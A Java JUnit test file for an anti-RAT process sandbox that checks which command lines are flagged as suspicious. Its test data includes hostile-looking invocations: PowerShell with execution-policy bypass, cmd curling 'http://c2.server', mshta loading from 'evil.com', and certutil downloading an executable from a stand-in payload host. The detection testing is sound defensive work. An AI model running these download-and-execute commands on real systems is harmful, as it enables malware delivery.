package com.antirat.core;

import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class ProcessExecutionSandboxTest {

    @Test
    void detectsPowerShellExecution() {
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", "Invoke-WebRequest")));
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("powershell", "-c", "echo hello")));
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("pwsh.exe", "-enc", "XYZ")));
    }

    @Test
    void detectsCmdExecution() {
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("cmd.exe", "/c", "start", "malware.exe")));
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("cmd", "/c", "curl", "http://c2.server")));
    }

    @Test
    void detectsScriptDroppers() {
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("wscript.exe", "payload.vbs")));
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("cscript", "script.js")));
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("mshta.exe", "http://evil.com/x.hta")));
        assertTrue(ProcessExecutionSandbox.isSuspiciousProcess(List.of("certutil.exe", "-urlcache", "-split", "-f", "http://payload.com/x.exe")));
    }

    @Test
    void allowsLegitimateBrowserNavigation() {
        assertFalse(ProcessExecutionSandbox.isSuspiciousProcess(List.of("rundll32", "url.dll,FileProtocolHandler", "https://modrinth.com/mod/skyhanni")));
        assertFalse(ProcessExecutionSandbox.isSuspiciousProcess(List.of("xdg-open", "https://discord.gg/hypixel")));
    }
}
